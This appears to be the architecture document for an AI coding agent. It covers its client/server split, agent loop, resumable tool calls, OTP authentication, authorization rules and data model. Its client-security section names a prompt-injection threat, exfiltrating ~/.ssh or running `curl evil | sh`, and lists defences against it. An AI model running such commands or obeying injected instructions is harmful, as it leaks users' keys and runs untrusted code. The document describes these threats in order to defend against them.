# Architecture

`jojo` is a terminal AI coding agent. The **client** is a Python curses app; the
**agent loop** is a Node service; the **model** is served by Ollama. Two ways to
wire them:

| Mode | Loop runs | Model | Auth |
|---|---|---|---|
| **local** | on your machine | your own Ollama | none |
| **remote** | on a server | the server's Ollama | email + OTP → opaque token |

Local mode is the whole product for a single user with a capable box. Remote mode
is a **reference hosted service** — multi-user, rented access, RBAC — that you can
self-host.

---

## Topology (remote mode)

Two deployment sites, because the inference box is powered off routinely and the
control plane must outlive it.

```
        ┌──────────────── user's machine ─────────────────┐
        │  jojo (curses TUI)                              │
        │   • OTP login        • tool executor (fs + exec, │
        │   • WS client          path-jailed, approvals)   │
        └──────┬───────────────────────────┬──────────────┘
               │ HTTPS (auth, status)      │ WSS (agent session)
               ▼                           ▼
   ┌──────── CONTROL PLANE ────────┐  ┌─── INFERENCE BACKEND ───┐
   │  (always on)                  │  │  (up only when the box   │
   │  • OTP issue / verify          │  │   is on)                 │
   │  • token mint + revoke         │  │  • WS gateway (authz on   │
   │  • accounts · grants · config  │◄─┤    connect + per message) │
   │  • authorize() decisions       │authz  • session manager     │
   │  • audit log                   │calls   (seats, idle, queue, │
   │  • Postgres (own database)     │        reaper, resume)      │
   └───────────────────────────────┘  │  • agent orchestrator     │
                                      │  • Ollama client (stream) │
                                      └───────────────────────────┘
```

**Source of truth:** accounts, grants, config and audit live in the control
plane. The backend holds live seat/session state and asks the control plane to
authorize each token (cached with a short TTL; **fail-closed** after the TTL if
the control plane is unreachable).

---

## The agent loop

Decision: **the loop runs server-side; tools execute on the client.** The backend
owns session state; the client is a thin executor of streamed tool requests. This
buys central control of behaviour/policy/audit and cross-device resumable
sessions, at the cost of a real reconnect/resume protocol.

```
on user_turn(text):
  append to transcript
  loop up to maxToolIterations:
    stream = ollama.chat(system + tools + trimmed_transcript)
    forward tokens to the client  (assistant_delta / thinking_delta)
    if the model emitted tool calls:
      for each: send tool_request{ id, name, args, destructive }
                await tool_result{ id, ... }        # idempotent by id
      continue
    else:
      send turn_done{ usage, stopReason }; break
```

Stop conditions: model done · per-turn tool cap · wall-clock limit · client
interrupt · lost authorization.

### Exactly-once tools + resume

- every `tool_request` carries a stable `id`
- the client keeps a journal: `id → result`
- on reconnect the backend re-sends any `tool_request` it has no result for,
  wrapped in `replay_begin` / `replay_end`
- the client, seeing an id already in its journal, returns the stored result
  **without re-executing the side effect**

Validated by `docs/phase0/spike-ws-resume/` (12/12 assertions: kill the client
mid-tool-call, reconnect, verify the side effect ran exactly once).

The wire contract is `server/shared/src/protocol.ts` (`PROTOCOL_VERSION`, close
codes, every message type).

---

## Authentication & authorization

- **Login is email + OTP, every time** — no long-lived password. A 6-digit code
  (only its SHA-256 stored), attempt-capped, single-use, rate-limited per email.
- **Tokens are opaque** — 32 random bytes, base64url; only the SHA-256 is stored.
  Revoke / suspend / expire is one column write, effective on the next request.
- **`authorize()`** (`server/shared/src/authorize.ts`) is a single pure function,
  evaluated at OTP request, OTP verify, WS connect, every inbound WS message
  (against a short-cached snapshot), and a periodic sweep:

  ```
  authorize(account, grants, service, now) -> ALLOW | DENY(reason)
    DENY if account missing / not approved / suspended / deleted
    (staff — ADMIN/SUPERADMIN — bypass the rest; SUPERADMIN also ignores maintenance)
    DENY if no grant with now ∈ [startsAt, expiresAt) and not revoked
          (reason: no_active_grant | not_yet_started | expired | revoked)
    DENY if now outside the open-hours schedule        (out_of_hours)
    DENY if the service is in maintenance              (maintenance)
    DENY if the account is payment-required and no paid payment is linked
                                                        (payment_required)
    else ALLOW
  ```

- **RBAC** (`server/shared/src/rbac.ts`): `USER < ADMIN < SUPERADMIN`, an explicit
  capability map, `can(role, capability)` and `atLeast(role, min)`. Ordinary users
  need an active time-boxed grant to connect; staff do not.

Covered by `authorize.test.ts` (10 cases) and `control-plane/src/index.test.ts`
(7 cases, real HTTP against the in-memory store).

---

## Seats, queue, idle, reaper

- A **seat** is held from WS connect until disconnect / logout / crash, or is
  auto-released after N minutes idle (configurable; "idle" = no user or agent
  activity — think time, tool runs and typing all keep it).
- When seats are full: `queue | reject` (configurable), with a max queue length
  and a max wait before auto-reject.
- **Reaper** sweeps for sessions with a dead socket and no heartbeat and frees
  their seats.
- **Inference queue** is separate from the seat cap: `maxConcurrentInference`
  slots in front of Ollama, sized from the benchmark (`docs/phase0/FINDINGS.md`).

---

## The client's permission model *is* a security component

With tools executing on the user's machine, a prompt-injected model could try to
get the client to exfiltrate `~/.ssh` or run `curl evil | sh`. So:

- **Path jail** — every path resolves inside the project root; `../`, symlinks
  and absolute escapes are refused before the tool runs.
- **Approval wall** — `write_file` and `run_command` need explicit `y/n/a` in the
  TUI, with a diff preview, regardless of any allow-list.
- **Untrusted output** — file and command output fed back to the model is framed
  as data, not instructions.
- **Crash-safe** — `curses.wrapper` restores the terminal, then the traceback is
  written to a crash log, never dumped over the restored screen.

---

## Data model

Control-plane Postgres (`server/shared/prisma/schema.prisma`):

| Entity | Holds |
|---|---|
| `Account` | email, `status` (pending/approved/suspended/deleted), `role`, `accessMode` (free/payment-required) |
| `AccessGrant` | a time-boxed authorization: `startsAt`, `expiresAt`, `revokedAt`, granted-by, reason |
| `AccessRequest` | public intake — not an account until approved |
| `OtpChallenge` | `codeHash`, expiry, attempts, max-attempts |
| `AuthSession` | `tokenHash`, expiry bound to `min(grant.expiresAt, sessionMaxTtl)` |
| `AgentSession` | one live session: state, seat, resume-token hash, end reason |
| `AgentTurn` | transcript + usage, one row per turn |
| `SessionQueueEntry` | a waiting client when seats are full |
| `Payment` | Razorpay order/payment, linked to the grant it activates |
| `AuditEvent` | every admin action and access decision (append-only) |
| `ServiceConfig` | singleton — every operator knob (seat cap, idle minutes, when-full, open hours, inference slots, TTLs) |

Dev and CI run the control plane against an **in-memory store**; the Prisma
adapter is the production path.

---

## Testing

| Layer | What |
|---|---|
| unit | `authorize()` truth table (status × grant state × hours × payment × role); RBAC |
| integration | control plane over real HTTP: OTP request → verify → token → `authz/check` → logout |
| chaos | `spike-ws-resume` — client crash mid-tool-call, reconnect, exactly-once |
| benchmark | `phase0/bench.mjs` — Ollama concurrency (tok/s, TTFT, memory headroom) |
| end-to-end | `install → jojo → agent loop` on localhost; OTP → backend authz → a tool round-trip |

---

## Key decisions

| # | Decision |
|---|---|
| D1 | Tool execution is **local**. The backend never touches the user's disk. |
| D2 | Agent loop runs **server-side**; persistent WS; reconnect + resume; idempotent tool replay. |
| D3 | **Separate identity** — the service has its own account store, zero coupling to any host app's auth. |
| D4 | All session policy is **operator-configurable** from an admin panel behind a SuperAdmin login. |
| D5 | **Public status page** that renders when the inference box is off. |
| D6 | Configurable **seat cap**, idle auto-release, `queue \| reject` when full. |
| D7 | Model concurrency **benchmarked** → `OLLAMA_NUM_PARALLEL=4`, `maxConcurrentInference` default 4. |
| D9 | Auth = **email + OTP** every login; no long-lived password. |
| D10 | Per-account **paid toggle** (Razorpay); the data model carries it from day one. |
| D12 | Backend in **TypeScript / Node** (`node --experimental-strip-types`, no build step). |
| D14 | Session token = **opaque random**, only its hash stored. |

The full build log — every task, what was verified, what broke — is
[`BUILD-PLAN.md`](BUILD-PLAN.md).
